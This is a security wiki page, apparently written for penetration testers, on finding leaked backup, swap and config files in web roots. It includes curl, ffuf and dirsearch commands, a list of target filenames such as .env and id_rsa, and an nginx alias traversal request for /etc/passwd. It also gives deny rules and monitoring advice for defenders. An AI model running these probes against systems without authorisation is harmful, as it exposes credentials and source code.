---
title: Backup and config leakage
slug: backup-and-config-leakage
---

> **TL;DR:** Editor swap files, `.bak`/`.old`/`~` copies, and stray config dumps left in the web root hand attackers credentials, source, or a route around authentication — found in minutes with the right wordlist.

## What it is
Developers and sysadmins routinely leave secondary copies of sensitive files next to the originals: `vim` writes `.config.php.swp`, `cp config.php config.php.bak` before an edit, `mv` produces `config.old`, and editors like `gedit` drop `config.php~`. When the web server serves these by extension (`.bak`, `.old`, `.swp`, `.orig`, `.tmp`, `~`) the language handler is bypassed — PHP source comes back as text instead of being executed. Add nginx `alias` typos that strip path prefixes and you get directory traversal for free.

## Preconditions / where it applies
- Web root edited in place (production debugging, shared hosting)
- Server has no explicit deny rule for backup extensions
- Default Apache/nginx config without `location ~ \.(bak|old|swp|orig)$` block
- Misconfigured `alias /static/ /var/www/static_files;` — note the trailing-slash mismatch enables `/static../`

## Technique
Brute the obvious paths first, then expand with a backup-aware wordlist.

```bash
# Single-shot probes
for ext in .bak .old .orig .swp .swo "~" .save .tmp .copy; do
  curl -s -o /dev/null -w "%{http_code} %{url}\n" "https://target/config.php$ext"
done

# Editor swap files use a leading dot and .swp/.swo suffix
curl -s https://target/.config.php.swp -o swap && vim -r swap

# Wordlist-driven discovery
ffuf -u https://target/FUZZ -w \
  /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt \
  -e .bak,.old,.swp,.orig,.save,~,.zip,.tar.gz,.sql

dirsearch -u https://target/ \
  -e php,bak,old,swp,zip,sql,env \
  -w /usr/share/seclists/Discovery/Web-Content/AllBackupExtensions.txt
```

High-value names to always try: `.env`, `.env.bak`, `config.php.bak`, `wp-config.php.swp`, `db.sqlite.bak`, `backup.zip`, `site.tar.gz`, `dump.sql`, `users.csv`, `id_rsa`, `.htpasswd`.

For `alias` traversal: if `/assets/` is `alias /var/www/assets_v2/`, request `/assets../etc/passwd` — nginx concatenates strings, not paths.

## Detection and defence
- Deny by extension at the edge: `location ~* \.(bak|old|orig|save|swp|swo|tmp|copy|~)$ { deny all; }`
- Edit configs outside the web root and deploy atomically; never `cp` next to live files
- WAF / log alert on bursts of 4xx with backup extensions
- File-integrity monitoring on `/var/www/` flags unexpected `*.bak`, `*.swp`
- CI lint that forbids backup-style filenames in build artefacts

## References
- [SecLists – AllBackupExtensions](https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content) — extension list
- [Acunetix – Backup file disclosure](https://www.acunetix.com/vulnerabilities/web/backup-file/) — class description
- [nginx alias traversal writeup](https://labs.detectify.com/2020/11/10/common-nginx-misconfigurations/) — alias/root pitfalls

See also: [[git-source-leakage]], [[information-disclosure]], [[banner-and-fingerprinting]].
